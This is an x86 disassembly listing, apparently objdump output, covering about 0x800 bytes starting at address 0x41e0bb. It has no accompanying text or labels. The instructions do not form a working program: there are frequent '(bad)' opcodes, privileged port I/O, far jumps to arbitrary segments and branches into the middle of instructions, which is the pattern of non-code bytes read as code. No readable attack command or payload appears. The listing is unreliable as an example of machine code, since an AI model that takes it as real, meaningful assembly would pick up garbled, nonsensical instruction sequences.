  41e0bb:	ret    0x2df8
  41e0be:	jle    0x41e103
  41e0c0:	jge    0x41e0b1
  41e0c2:	and    DWORD PTR [edi],edi
  41e0c4:	dec    edx
  41e0c5:	adc    cl,BYTE PTR [ebx+0x1fa0ba47]
  41e0cb:	and    DWORD PTR [eax+0x3d],0xffffffae
  41e0cf:	mov    WORD PTR [ebx+0x5e5c66f1],?
  41e0d5:	add    al,BYTE PTR [eax]
  41e0d7:	push   ss
  41e0d8:	mov    dh,0x15
  41e0da:	push   cs
  41e0db:	jnp    0x41e0a4
  41e0dd:	dec    ebx
  41e0de:	out    0xda,eax
  41e0e0:	(bad)  
  41e0e1:	push   edx
  41e0e2:	push   0x9
  41e0e4:	aaa    
  41e0e5:	and    ch,al
  41e0e7:	retf   
  41e0e8:	das    
  41e0e9:	pop    edi
  41e0ea:	xchg   edi,eax
  41e0eb:	xor    al,0x6c
  41e0ed:	inc    edi
  41e0ee:	js     0x41e116
  41e0f0:	xchg   ebx,eax
  41e0f1:	xchg   ebp,eax
  41e0f2:	pushf  
  41e0f3:	jmp    0x41e081
  41e0f5:	or     eax,0xdbc1c968
  41e0fa:	(bad)  [ebx-0x6264bff8]
  41e100:	inc    edi
  41e101:	out    dx,eax
  41e102:	sbb    ch,al
  41e104:	mov    cl,0xd7
  41e106:	sbb    ebp,DWORD PTR [ecx-0x40]
  41e109:	or     eax,0x7cb31dff
  41e10e:	mov    BYTE PTR [edi-0x188cacfb],ch
  41e114:	and    eax,0x110db403
  41e119:	mov    fs,WORD PTR [edx-0x4c]
  41e11c:	dec    ebx
  41e11d:	sub    DWORD PTR [edx-0x75],ebp
  41e120:	jnp    0x41e197
  41e122:	retf   
  41e123:	adc    dh,ch
  41e125:	lock or cl,bh
  41e128:	push   ss
  41e129:	aas    
  41e12a:	or     ecx,ecx
  41e12c:	jle    0x41e178
  41e12e:	push   esi
  41e12f:	mov    esi,0x231d96f1
  41e134:	adc    BYTE PTR [ebp+ebx*4-0x4ba8604e],cl
  41e13b:	mov    ds:0xf238ab83,eax
  41e140:	fimul  DWORD PTR [edx]
  41e142:	mov    al,ds:0xb501a505
  41e147:	mov    esi,0x2a590414
  41e14c:	adc    BYTE PTR [ebp-0x4d],ah
  41e14f:	fnstcw WORD PTR [edx+0x5ed5a384]
  41e155:	std    
  41e156:	dec    edx
  41e157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e158:	mov    ebp,0x3017f3a1
  41e15d:	les    bp,DWORD PTR ds:0x833a1eee
  41e164:	lahf   
  41e165:	pop    eax
  41e166:	fist   DWORD PTR [ebp-0xe]
  41e169:	jne    0x41e11a
  41e16b:	lds    ebx,FWORD PTR [edx+edx*1+0x23]
  41e16f:	push   eax
  41e170:	sbb    cl,BYTE PTR [edx-0x187688a4]
  41e176:	pop    ss
  41e177:	fbld   TBYTE PTR [ecx+0x28]
  41e17a:	(bad)  
  41e17b:	loop   0x41e196
  41e17d:	jo     0x41e127
  41e17f:	or     BYTE PTR [ecx+eiz*4+0x64d39f40],0xc6
  41e187:	mov    edx,0x473914d
  41e18c:	rcr    BYTE PTR [edi+eax*2],cl
  41e18f:	shr    BYTE PTR [esi-0x5055bcd8],0xb8
  41e196:	inc    edx
  41e197:	push   ss
  41e198:	jno    0x41e1e6
  41e19a:	ins    DWORD PTR es:[edi],dx
  41e19b:	in     eax,0x8f
  41e19d:	icebp  
  41e19e:	push   esi
  41e19f:	push   edx
  41e1a0:	addr16 inc esi
  41e1a2:	pop    ecx
  41e1a3:	mov    bh,ah
  41e1a5:	(bad)  
  41e1a6:	pop    ecx
  41e1a7:	mov    ebx,0xfad407f8
  41e1ac:	(bad)  
  41e1ad:	cli    
  41e1ae:	call   0xa30c4bdb
  41e1b3:	daa    
  41e1b4:	push   esi
  41e1b5:	call   0xd808:0x47045633
  41e1bc:	fcomp  QWORD PTR [edx-0x34]
  41e1bf:	loope  0x41e17c
  41e1c1:	push   esp
  41e1c2:	ror    DWORD PTR [edx],0x5f
  41e1c5:	mov    dl,0x6
  41e1c7:	ficomp DWORD PTR [edx+0x103c813f]
  41e1cd:	out    0x1e,eax
  41e1cf:	mov    cs,edx
  41e1d1:	cmp    DWORD PTR [edi],0xffffffe3
  41e1d4:	mov    DWORD PTR [eax+0x2a],0x58792083
  41e1db:	pop    eax
  41e1dc:	cmp    BYTE PTR [edi],bh
  41e1de:	jl     0x41e210
  41e1e0:	rcr    bh,1
  41e1e2:	sub    edx,esi
  41e1e4:	pop    eax
  41e1e5:	popa   
  41e1e6:	jmp    0xa954:0xd53bbfe
  41e1ed:	in     al,dx
  41e1ee:	or     ecx,DWORD PTR [edi+0x13113af2]
  41e1f4:	aas    
  41e1f5:	xchg   ebx,eax
  41e1f6:	aas    
  41e1f7:	mov    al,ds:0xd7c2342d
  41e1fc:	mov    al,0x5a
  41e1fe:	shl    BYTE PTR [edi],0xff
  41e201:	(bad)  
  41e203:	ret    0x1baa
  41e206:	dec    edx
  41e207:	inc    eax
  41e208:	nop
  41e209:	inc    esp
  41e20a:	aad    0xec
  41e20c:	xor    al,0x66
  41e20e:	ja     0x41e244
  41e210:	test   al,0xbf
  41e212:	sbb    DWORD PTR [eax-0x46],esi
  41e215:	sbb    al,0x40
  41e217:	fiadd  WORD PTR [ebp+ebp*4+0x4d]
  41e21b:	out    dx,eax
  41e21c:	jae    0x41e284
  41e21e:	cmp    al,0xe9
  41e220:	mov    edx,0x27b2684
  41e225:	pushf  
  41e226:	sub    bl,dh
  41e228:	ss (bad) 
  41e22a:	sub    edx,DWORD PTR ds:0xbfa69640
  41e230:	ret    0x8f78
  41e233:	dec    esp
  41e234:	les    esp,FWORD PTR [edi-0x3a]
  41e237:	mov    esp,0xd8dfbdf1
  41e23c:	sbb    al,BYTE PTR gs:[edx-0x243a6840]
  41e243:	test   DWORD PTR [edx],ebp
  41e245:	dec    ebp
  41e246:	stos   BYTE PTR es:[edi],al
  41e247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e248:	push   0x60
  41e24a:	lods   al,BYTE PTR ds:[esi]
  41e24b:	rol    BYTE PTR [edx],0x56
  41e24e:	xchg   esp,eax
  41e24f:	int    0x4
  41e251:	lock dec ebp
  41e253:	or     esi,ecx
  41e255:	std    
  41e256:	jl     0x41e27b
  41e258:	stc    
  41e259:	call   0x9bd6d966
  41e25e:	pop    edi
  41e25f:	(bad)  
  41e260:	and    WORD PTR [eax-0x2e],ax
  41e264:	sbb    cl,BYTE PTR [ecx]
  41e266:	(bad)  
  41e268:	stc    
  41e269:	lods   al,BYTE PTR ds:[esi]
  41e26a:	pop    ebx
  41e26b:	mov    al,ds:0xab5e9b37
  41e270:	loop   0x41e203
  41e272:	scas   al,BYTE PTR es:[edi]
  41e273:	je     0x41e29a
  41e275:	cmp    al,0x92
  41e277:	scas   eax,DWORD PTR es:[edi]
  41e278:	clc    
  41e279:	ins    DWORD PTR es:[edi],dx
  41e27a:	outs   dx,BYTE PTR ds:[esi]
  41e27b:	and    DWORD PTR [ecx],eax
  41e27d:	push   ds
  41e27e:	cdq    
  41e27f:	push   esi
  41e280:	xor    BYTE PTR [edx+0x4e24ebdb],ah
  41e286:	xchg   ebx,eax
  41e287:	sbb    al,0xbe
  41e289:	mov    cl,0x67
  41e28b:	pop    es
  41e28c:	je     0x41e24b
  41e28e:	lds    eax,FWORD PTR [edi]
  41e290:	test   BYTE PTR ss:[edi],bh
  41e293:	(bad)  
  41e294:	repz sar BYTE PTR [esi],1
  41e297:	jp     0x41e2ab
  41e299:	out    0x7c,al
  41e29b:	push   esi
  41e29c:	pushf  
  41e29d:	xor    eax,0x5d9bb2b8
  41e2a2:	adc    DWORD PTR ds:0xbb626e6b,ebp
  41e2a8:	cmp    al,0x4d
  41e2aa:	and    eax,0xe2fb3315
  41e2af:	inc    edx
  41e2b0:	lahf   
  41e2b1:	jne    0x41e2c2
  41e2b3:	add    eax,0x83ca912e
  41e2b8:	jo     0x41e2df
  41e2ba:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2bc:	mov    eax,0xae62bf1f
  41e2c1:	jns    0x41e257
  41e2c3:	sub    DWORD PTR [edx+ecx*4],ebp
  41e2c6:	mov    eax,ds:0xa6a3fd34
  41e2cb:	lods   eax,DWORD PTR ds:[esi]
  41e2cc:	or     dh,al
  41e2ce:	sub    BYTE PTR [esi],ch
  41e2d0:	imul   ebp,DWORD PTR [ebp+0x54],0x3a
  41e2d4:	jmp    0xfe97:0xa74d9d35
  41e2db:	jb     0x41e2e2
  41e2dd:	xchg   esi,eax
  41e2de:	outs   dx,DWORD PTR ds:[esi]
  41e2df:	sub    al,0x28
  41e2e1:	ror    DWORD PTR [eax],0x4
  41e2e4:	ret    0xe05e
  41e2e7:	shl    BYTE PTR [ebx],0x7
  41e2ea:	sbb    ah,ch
  41e2ec:	and    DWORD PTR [esi],esp
  41e2ee:	sti    
  41e2ef:	test   al,0x8c
  41e2f1:	mov    ah,0xfa
  41e2f3:	jecxz  0x41e335
  41e2f5:	xor    eax,0x95125649
  41e2fa:	call   0xdbd88261
  41e2ff:	clc    
  41e300:	test   eax,0xea4e09e0
  41e305:	push   cs
  41e306:	rcl    BYTE PTR [esi],0x11
  41e309:	int3   
  41e30a:	pop    eax
  41e30b:	ror    BYTE PTR [ebp-0x114a9d4],1
  41e311:	int    0x70
  41e313:	mov    cl,0x68
  41e315:	mov    BYTE PTR [edx+ecx*1-0x56c2f32f],0xac
  41e31d:	and    al,0xfb
  41e31f:	sub    cl,BYTE PTR [esi+esi*4-0x545426e5]
  41e326:	or     BYTE PTR [eax],ah
  41e328:	mov    ebx,0xab184d9e
  41e32d:	ret    
  41e32e:	cwde   
  41e32f:	dec    edi
  41e330:	cmp    eax,0xd2033e4f
  41e335:	jl     0x41e2b7
  41e337:	cs out dx,eax
  41e339:	or     DWORD PTR [ecx+0x40],0x5b2057dd
  41e340:	cmp    eax,ebp
  41e342:	dec    esp
  41e343:	cmp    DWORD PTR ds:0xf584e962,edx
  41e349:	shl    bl,cl
  41e34b:	xchg   esp,eax
  41e34c:	retf   
  41e34d:	dec    edi
  41e34e:	mov    ah,0xf2
  41e350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e351:	shl    DWORD PTR [eax-0x26],cl
  41e354:	popa   
  41e355:	dec    edi
  41e356:	or     al,ch
  41e358:	nop
  41e359:	jns    0x41e3d3
  41e35b:	pusha  
  41e35c:	xor    edi,DWORD PTR [eax]
  41e35e:	sbb    DWORD PTR [ebp-0x37],esp
  41e361:	imul   edx,DWORD PTR [ebx-0x6dd5550c],0x67cd7dee
  41e36b:	enter  0xf26e,0xb4
  41e36f:	aad    0x71
  41e371:	push   0x747e9e6f
  41e376:	pop    edx
  41e377:	test   BYTE PTR [edi],0xf5
  41e37a:	ja     0x41e3b5
  41e37c:	xor    eax,0x18f2d6eb
  41e381:	mov    ds:0xe72cf75b,al
  41e386:	(bad)  
  41e387:	mov    esi,DWORD PTR [edx+0x10b573ae]
  41e38d:	bswap  eax
  41e38f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e390:	mov    esi,0xc0302225
  41e395:	or     al,bh
  41e397:	popf   
  41e398:	cmp    DWORD PTR [ecx+0x6821087f],edx
  41e39e:	fucom  st(4)
  41e3a0:	mov    al,ds:0xc5853865
  41e3a5:	pop    es
  41e3a6:	stos   DWORD PTR es:[edi],eax
  41e3a7:	adc    al,0xdf
  41e3a9:	sbb    bh,BYTE PTR [ecx+0x5d]
  41e3ac:	fisubr WORD PTR [ebp+0x7b]
  41e3af:	cmp    ebp,0xe
  41e3b2:	aas    
  41e3b3:	jb     0x41e35f
  41e3b5:	and    eax,0x891681f5
  41e3ba:	shl    BYTE PTR [edx+0x2f],1
  41e3bd:	jmp    0x41e3c4
  41e3bf:	test   al,0xfb
  41e3c1:	leave  
  41e3c2:	shl    DWORD PTR ds:0x1e893a6f,cl
  41e3c8:	into   
  41e3c9:	(bad)  
  41e3ca:	out    dx,eax
  41e3cb:	rcl    edi,1
  41e3cd:	adc    DWORD PTR ds:[esi+0x3c],0x57
  41e3d2:	cmp    eax,0x89641b11
  41e3d7:	push   es
  41e3d8:	lahf   
  41e3d9:	mov    edi,0xefe2d230
  41e3de:	xchg   ebp,eax
  41e3df:	stos   DWORD PTR es:[edi],eax
  41e3e0:	mov    dh,dh
  41e3e2:	das    
  41e3e3:	js     0x41e462
  41e3e5:	pop    ebx
  41e3e6:	(bad)  
  41e3ea:	and    DWORD PTR [ebp-0xd3cb4d9],esp
  41e3f0:	adc    bh,bh
  41e3f2:	jmp    0x4811:0x8acdf2cb
  41e3f9:	mov    edi,0xc3ab3676
  41e3fe:	int    0x34
  41e400:	mov    dh,0xed
  41e402:	pop    esp
  41e403:	inc    DWORD PTR [edx+0x1b]
  41e406:	loop   0x41e3ac
  41e408:	adc    bl,bh
  41e40a:	xor    ah,BYTE PTR [ecx+0x73]
  41e40d:	icebp  
  41e40e:	mov    esi,DWORD PTR [edi-0x3185ea52]
  41e414:	out    dx,eax
  41e415:	dec    ebx
  41e416:	xlat   BYTE PTR ds:[ebx]
  41e417:	fwait
  41e418:	jno    0x41e458
  41e41a:	jne    0x41e3a8
  41e41c:	fwait
  41e41d:	add    DWORD PTR [esi-0x4282d66b],ebx
  41e423:	cmp    al,0x1a
  41e425:	frstor ds:0x2a221764
  41e42b:	mov    eax,ds:0xc9263bbc
  41e430:	scas   al,BYTE PTR es:[edi]
  41e431:	sbb    cl,BYTE PTR [ebx]
  41e433:	sub    al,BYTE PTR [edi+0x4b]
  41e436:	leave  
  41e437:	jl     0x41e3cf
  41e439:	aad    0x67
  41e43b:	cmp    ebp,DWORD PTR [eax-0x70e933ca]
  41e441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e442:	hlt    
  41e443:	mov    bh,0x27
  41e445:	imul   eax,esp,0xffffff86
  41e448:	ja     0x41e44e
  41e44a:	das    
  41e44b:	xchg   BYTE PTR [esi+0x43],dh
  41e44e:	push   0xffffffa9
  41e450:	jns    0x41e440
  41e452:	fidiv  WORD PTR [edx]
  41e454:	and    al,0xdd
  41e456:	mov    al,0x17
  41e458:	or     al,0x4f
  41e45a:	mov    dl,0x53
  41e45c:	ja     0x41e3f5
  41e45e:	mov    ah,0x88
  41e460:	mov    ds:0x75fff286,al
  41e465:	das    
  41e466:	stos   DWORD PTR es:[edi],eax
  41e467:	loopne 0x41e465
  41e469:	sbb    eax,DWORD PTR [edx+0x76479e1e]
  41e46f:	push   cs
  41e470:	cmp    eax,0x1a7ab5c1
  41e475:	push   ebp
  41e476:	ficomp WORD PTR [esi]
  41e478:	mov    dl,0x83
  41e47a:	arpl   bp,dx
  41e47c:	or     BYTE PTR [ebx+0x3],al
  41e47f:	je     0x41e457
  41e481:	sbb    BYTE PTR [ebp+0x7a],bl
  41e484:	outs   dx,DWORD PTR ds:[esi]
  41e485:	adc    eax,0x7be2ff2
  41e48a:	test   eax,0x783557e5
  41e48f:	sub    al,0xa8
  41e491:	mov    esi,0x457338e1
  41e496:	cmp    ebp,ebx
  41e498:	pushf  
  41e499:	out    0x72,al
  41e49b:	stc    
  41e49c:	imul   edi,ebx,0x48
  41e49f:	imul   si,WORD PTR [edx-0x71ddf393],0xffb7
  41e4a7:	outs   dx,DWORD PTR ds:[esi]
  41e4a8:	xchg   DWORD PTR [edx],esi
  41e4aa:	paddsw mm2,QWORD PTR ds:0x8f9e2428
  41e4b1:	xchg   BYTE PTR [esi-0x24f8a28e],ah
  41e4b7:	lods   al,BYTE PTR ds:[esi]
  41e4b8:	mov    BYTE PTR [edx-0x459d26ff],cl
  41e4be:	mov    ah,0xa6
  41e4c0:	lds    edi,FWORD PTR [ecx]
  41e4c2:	loopne 0x41e4a9
  41e4c4:	cmp    ch,ch
  41e4c6:	in     al,dx
  41e4c7:	mov    ?,WORD PTR [esi+0x175363e0]
  41e4cd:	in     eax,dx
  41e4ce:	xor    esi,eax
  41e4d0:	jbe    0x41e529
  41e4d2:	enter  0x2bf4,0x10
  41e4d6:	sbb    dh,cl
  41e4d8:	fcomi  st,st(2)
  41e4da:	jne    0x41e52c
  41e4dc:	sahf   
  41e4dd:	rcr    DWORD PTR [ecx-0x4d2dc679],cl
  41e4e3:	jmp    0x41e556
  41e4e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4e6:	jmp    0x41e4ea
  41e4e8:	xchg   BYTE PTR [ebx+0x3a],ah
  41e4eb:	(bad)  
  41e4ec:	cmp    DWORD PTR [esi-0x32],edx
  41e4ef:	cli    
  41e4f0:	xor    eax,0x19997b93
  41e4f5:	ja     0x41e489
  41e4f7:	mov    cl,0x47
  41e4f9:	and    al,0xc
  41e4fb:	popa   
  41e4fc:	outs   dx,DWORD PTR ds:[esi]
  41e4fd:	ins    DWORD PTR es:[edi],dx
  41e4fe:	xor    al,0x8a
  41e500:	jl     0x41e4c6
  41e502:	imul   ecx,DWORD PTR [edx],0xfffffff9
  41e505:	or     ch,bh
  41e507:	mov    esi,0xe5865c14
  41e50c:	jb     0x41e4d1
  41e50e:	mov    ebx,0x13cef9d5
  41e513:	gs dec ebp
  41e515:	test   cl,bh
  41e517:	cld    
  41e518:	jo     0x41e4eb
  41e51a:	jecxz  0x41e4be
  41e51c:	stos   DWORD PTR es:[edi],eax
  41e51d:	inc    esi
  41e51e:	and    al,0xa1
  41e520:	xlat   BYTE PTR ds:[ebx]
  41e521:	add    esp,DWORD PTR [edx-0x7ec10328]
  41e527:	xchg   esp,eax
  41e528:	mov    ecx,0x1b9a96c
  41e52d:	cmp    eax,0xd1c2a2c6
  41e532:	adc    al,0x32
  41e534:	mov    eax,0x49ba214a
  41e539:	mov    edi,0x42e0c0b8
  41e53e:	add    DWORD PTR [ecx-0x452f6bbf],edi
  41e544:	rol    BYTE PTR [ebx+eax*8+0x55],cl
  41e548:	and    eax,0xaeb2e4ba
  41e54d:	inc    edi
  41e54e:	rcl    BYTE PTR [edx],0xd9
  41e551:	test   BYTE PTR [eax-0x3eaec857],ch
  41e557:	ja     0x41e533
  41e559:	and    eax,0x9924f150
  41e55e:	fsubr  st,st(1)
  41e560:	rcr    BYTE PTR [edx+0x382c1e57],0x13
  41e567:	and    eax,0xb3dd6c00
  41e56c:	xchg   edi,eax
  41e56d:	push   eax
  41e56e:	jo     0x41e5d6
  41e570:	or     eax,0x3785b0c
  41e575:	in     al,dx
  41e576:	jbe    0x41e5b0
  41e578:	ror    BYTE PTR [edi+0x3250f93a],cl
  41e57e:	sahf   
  41e57f:	cli    
  41e580:	push   cs
  41e581:	mov    ecx,0xa54c3b0
  41e586:	and    al,0xa1
  41e588:	call   0x87bc8721
  41e58d:	retf   
  41e58e:	ins    DWORD PTR es:[edi],dx
  41e58f:	xchg   esi,eax
  41e590:	or     al,0x9d
  41e592:	aaa    
  41e593:	dec    ebx
  41e594:	stos   BYTE PTR es:[edi],al
  41e595:	jno    0x41e54c
  41e597:	sub    eax,0x9e715165
  41e59c:	(bad)  
  41e59d:	push   ecx
  41e59e:	cmp    BYTE PTR ds:0xbb99c6c3,0xa7
  41e5a5:	cwde   
  41e5a6:	or     al,0x6c
  41e5a8:	inc    eax
  41e5a9:	test   BYTE PTR [ecx+0x44],cl
  41e5ac:	fbld   TBYTE PTR [eax-0x49092824]
  41e5b2:	in     al,0xfc
  41e5b4:	and    ebx,ecx
  41e5b6:	fistp  QWORD PTR [ecx+esi*2-0x1f569101]
  41e5bd:	test   DWORD PTR [ecx-0x19],0xdccf397d
  41e5c4:	adc    BYTE PTR [edx],dl
  41e5c6:	stos   BYTE PTR es:[edi],al
  41e5c7:	bnd call DWORD PTR [ebx+0x231aaea2]
  41e5ce:	inc    eax
  41e5cf:	std    
  41e5d0:	jns    0x41e616
  41e5d2:	jbe    0x41e606
  41e5d4:	popa   
  41e5d5:	out    dx,al
  41e5d6:	sbb    cl,0xa4
  41e5d9:	push   ebx
  41e5da:	in     eax,dx
  41e5db:	push   esi
  41e5dc:	je     0x41e601
  41e5de:	inc    edx
  41e5df:	jmp    0xa370ee96
  41e5e4:	and    DWORD PTR [ecx-0x63],eax
  41e5e7:	jge    0x41e5da
  41e5e9:	hlt    
  41e5ea:	pop    ss
  41e5eb:	push   edi
  41e5ec:	in     eax,0x1e
  41e5ee:	pushf  
  41e5ef:	std    
  41e5f0:	mov    esi,0x5aa17c0e
  41e5f5:	mov    esi,0xa388f4ee
  41e5fa:	and    BYTE PTR [esi-0x41cff665],dh
  41e600:	cdq    
  41e601:	fiadd  DWORD PTR [ebx]
  41e603:	rol    ebp,1
  41e605:	and    dh,al
  41e607:	mov    al,0xec
  41e609:	jne    0x41e676
  41e60b:	jg     0x41e61a
  41e60d:	jp     0x41e5ff
  41e60f:	pop    esp
  41e610:	sub    cl,BYTE PTR [edx+0x127d7c13]
  41e616:	into   
  41e617:	mov    dh,0xda
  41e619:	xor    DWORD PTR [edx+ecx*8],0xbd1765d3
  41e620:	loope  0x41e5b7
  41e622:	sbb    edx,ebp
  41e624:	jne    0x41e5c0
  41e626:	shr    BYTE PTR [ecx-0x3a],cl
  41e629:	pop    ebx
  41e62a:	aaa    
  41e62b:	ret    0x2464
  41e62e:	into   
  41e62f:	hlt    
  41e630:	xor    DWORD PTR ds:0x9606ea95,0x10
  41e637:	sub    eax,DWORD PTR [eax+0x7b5e5ca]
  41e63d:	and    DWORD PTR [ebx+edx*4],0xffffffb7
  41e641:	jno    0x41e652
  41e643:	xchg   esi,eax
  41e644:	sbb    dl,BYTE PTR [esi]
  41e646:	add    eax,0x4b0dfbaa
  41e64b:	sbb    al,BYTE PTR [ebx+0x34a7759a]
  41e651:	jg     0x41e6d2
  41e653:	lahf   
  41e654:	das    
  41e655:	mov    dh,0x41
  41e657:	push   edi
  41e658:	cmp    ah,dl
  41e65a:	ds fwait
  41e65c:	and    DWORD PTR [edi-0x67],ebx
  41e65f:	mov    ch,0xfc
  41e661:	mul    BYTE PTR ds:0xc2677c78
  41e667:	loope  0x41e643
  41e669:	push   es
  41e66a:	fptan  
  41e66c:	push   ecx
  41e66d:	sbb    BYTE PTR [ebx+ebx*1-0x4ffefce4],dl
  41e674:	fisttp QWORD PTR [esi*4-0x243d3e5e]
  41e67b:	xchg   DWORD PTR [ecx],edi
  41e67d:	loopne 0x41e60c
  41e67f:	sahf   
  41e680:	stos   BYTE PTR es:[edi],al
  41e681:	inc    edi
  41e682:	jns    0x41e6bf
  41e684:	in     eax,dx
  41e685:	(bad)  
  41e686:	jmp    0xc929e2c8
  41e68b:	test   BYTE PTR [edi+0x2d1ffa58],0x62
  41e692:	add    edx,DWORD PTR ds:0xe1f6da33
  41e698:	jns    0x41e62a
  41e69a:	pop    ss
  41e69b:	jo     0x41e6f4
  41e69d:	inc    ebp
  41e69e:	cmp    bh,BYTE PTR [ecx-0x32]
  41e6a1:	ins    DWORD PTR es:[edi],dx
  41e6a2:	xchg   edx,eax
  41e6a3:	call   0xe7f6:0x628a006f
  41e6aa:	sub    ebx,DWORD PTR [ecx+0x6a464d7f]
  41e6b0:	jo     0x41e6d6
  41e6b2:	inc    edi
  41e6b3:	shl    edi,cl
  41e6b5:	sub    dl,BYTE PTR [ebx+0x26beac33]
  41e6bb:	aad    0x50
  41e6bd:	sbb    dl,dl
  41e6bf:	dec    esi
  41e6c0:	dec    edx
  41e6c1:	xor    BYTE PTR ds:0x3962aab7,0x78
  41e6c8:	push   esi
  41e6c9:	test   eax,0xfea2d659
  41e6ce:	adc    al,0xd3
  41e6d0:	neg    DWORD PTR [eax]
  41e6d2:	arpl   bp,sp
  41e6d4:	loop   0x41e6b3
  41e6d6:	mov    ah,0xb1
  41e6d8:	mov    bl,0xc
  41e6da:	scas   eax,DWORD PTR es:[edi]
  41e6db:	loope  0x41e6a5
  41e6dd:	or     bl,al
  41e6df:	and    BYTE PTR [ebx-0x63],0x3d
  41e6e3:	jns    0x41e6cc
  41e6e5:	sub    al,BYTE PTR [ebx+0x57]
  41e6e8:	xor    esi,DWORD PTR [ebp+0x25]
  41e6eb:	outs   dx,DWORD PTR ds:[esi]
  41e6ec:	aas    
  41e6ed:	push   edi
  41e6ee:	(bad)  
  41e6ef:	icebp  
  41e6f0:	cmp    esi,DWORD PTR [edi+0x3f630e1b]
  41e6f6:	and    edi,esp
  41e6f8:	les    ebx,FWORD PTR [esi+0x1f]
  41e6fb:	add    DWORD PTR [edi+0x5],0xb91bb2f2
  41e702:	arpl   bp,ax
  41e704:	mov    al,ds:0xa42ae58f
  41e709:	cmp    eax,0x2e662764
  41e70e:	mov    ah,0xd9
  41e710:	sub    DWORD PTR ds:[ecx+0x67],eax
  41e714:	cmp    BYTE PTR [edx],al
  41e716:	lea    ecx,[ebp+0x3886ce6a]
  41e71c:	jo     0x41e69e
  41e71e:	mov    al,0x12
  41e720:	ja     0x41e722
  41e722:	popf   
  41e723:	loop   0x41e70f
  41e725:	call   0x5d6f:0xf2ea3f94
  41e72c:	and    BYTE PTR [eax+0x32],bl
  41e72f:	in     al,0x42
  41e731:	mov    bl,0xfc
  41e733:	retf   
  41e734:	push   esi
  41e735:	int    0xd2
  41e737:	ja     0x41e72d
  41e739:	ret    
  41e73a:	ja     0x41e70d
  41e73c:	gs popf 
  41e73e:	inc    esi
  41e73f:	gs out dx,al
  41e741:	frstor [edi-0x3fe6ecc0]
  41e747:	dec    ebp
  41e748:	push   esi
  41e749:	xor    eax,0x3c6a7331
  41e74e:	fsub   DWORD PTR [eax+ebp*4+0x45]
  41e752:	rol    DWORD PTR [esi+ebp*4-0x547e8c58],1
  41e759:	add    dh,BYTE PTR [ecx+0x3bb262a6]
  41e75f:	fsubr  st,st(3)
  41e761:	scas   al,BYTE PTR es:[edi]
  41e762:	sbb    al,0x20
  41e764:	push   ds
  41e765:	sti    
  41e766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e767:	xor    DWORD PTR [edi],0xc8b7cb9a
  41e76d:	inc    ebx
  41e76e:	(bad)  
  41e76f:	test   eax,0xb1508afb
  41e774:	in     al,0x54
  41e776:	jne    0x41e7de
  41e778:	mov    bl,0x4f
  41e77a:	test   eax,0x3d509860
  41e77f:	mov    ?,esi
  41e781:	xchg   ebp,eax
  41e782:	les    esp,FWORD PTR [edx-0x44]
  41e785:	fdivr  DWORD PTR [edx-0x14]
  41e788:	jae    0x41e746
  41e78a:	and    DWORD PTR [edx],esp
  41e78c:	pop    esi
  41e78d:	sbb    al,0xaa
  41e78f:	ja     0x41e74a
  41e791:	(bad)  
  41e792:	out    0xc8,eax
  41e794:	retf   
  41e795:	jnp    0x41e7ca
  41e797:	mov    bl,0xb2
  41e799:	stc    
  41e79a:	aaa    
  41e79b:	lahf   
  41e79c:	arpl   WORD PTR [eax],si
  41e79e:	ds (bad) 
  41e7a0:	out    0xae,al
  41e7a2:	das    
  41e7a3:	scas   al,BYTE PTR es:[edi]
  41e7a4:	jmp    0x41e7ad
  41e7a6:	fisub  DWORD PTR [edi-0x376243a]
  41e7ac:	xchg   BYTE PTR [ecx+ecx*4],dl
  41e7af:	out    dx,al
  41e7b0:	shl    DWORD PTR [ebp-0x13ce7895],0xee
  41e7b7:	fdivp  st(6),st
  41e7b9:	inc    ecx
  41e7ba:	sbb    DWORD PTR [esi+0x50],esp
  41e7bd:	push   edi
  41e7be:	ret    
  41e7bf:	mov    bl,0xea
  41e7c1:	add    al,0x60
  41e7c3:	mov    ecx,0x3384eee1
  41e7c8:	pop    eax
  41e7c9:	pop    edi
  41e7ca:	loopne 0x41e7c2
  41e7cc:	ret    
  41e7cd:	data16 (bad) 
  41e7cf:	xchg   ebp,eax
  41e7d0:	adc    edi,DWORD PTR [ecx+0x54]
  41e7d3:	mov    al,0x4a
  41e7d5:	sub    cl,al
  41e7d7:	sbb    DWORD PTR cs:[esi+0x1ddd9bdc],0x35
  41e7df:	jno    0x41e782
  41e7e1:	scas   al,BYTE PTR es:[edi]
  41e7e2:	inc    esi
  41e7e3:	repnz lock xchg ebp,eax
  41e7e6:	lds    eax,FWORD PTR [eax+0x501b9193]
  41e7ec:	(bad)  
  41e7ee:	shl    bh,1
  41e7f0:	xchg   ecx,eax
  41e7f1:	fwait
  41e7f2:	ret    0x28af
  41e7f5:	pop    edx
  41e7f6:	inc    edi
  41e7f7:	addr16 daa 
  41e7f9:	pop    edi
  41e7fa:	inc    eax
  41e7fb:	mov    edx,?
  41e7fd:	daa    
  41e7fe:	mov    bh,0x57
  41e800:	cmc    
  41e801:	or     eax,0xf9ddff34
  41e806:	sub    ecx,ebp
  41e808:	call   0x8a741dfa
  41e80d:	adc    DWORD PTR [edi-0x24bb6ef5],0x96b63d82
  41e817:	into   
  41e818:	push   esi
  41e819:	aad    0x17
  41e81b:	inc    ecx
  41e81c:	pop    edx
  41e81d:	mov    esp,DWORD PTR [eax]
  41e81f:	jne    0x41e855
  41e821:	mov    ebp,ebp
  41e823:	jmp    0xb5e92393
  41e828:	lods   eax,DWORD PTR ds:[esi]
  41e829:	les    esi,FWORD PTR [edi]
  41e82b:	dec    esi
  41e82c:	(bad)  
  41e82d:	push   edi
  41e82e:	jge    0x41e813
  41e830:	mov    esp,ebx
  41e832:	repnz push es
  41e834:	sub    BYTE PTR [ebx],ah
  41e836:	dec    edx
  41e837:	mov    al,ds:0x18c86f0a
  41e83c:	and    bh,BYTE PTR [esi-0x344f3922]
  41e842:	and    BYTE PTR [ecx],bh
  41e844:	aas    
  41e845:	add    ebx,ecx
  41e847:	lods   al,BYTE PTR ds:[esi]
  41e848:	(bad)  
  41e849:	not    BYTE PTR [ecx+0x72]
  41e84c:	iret   
  41e84d:	or     edx,ecx
  41e84f:	(bad)  
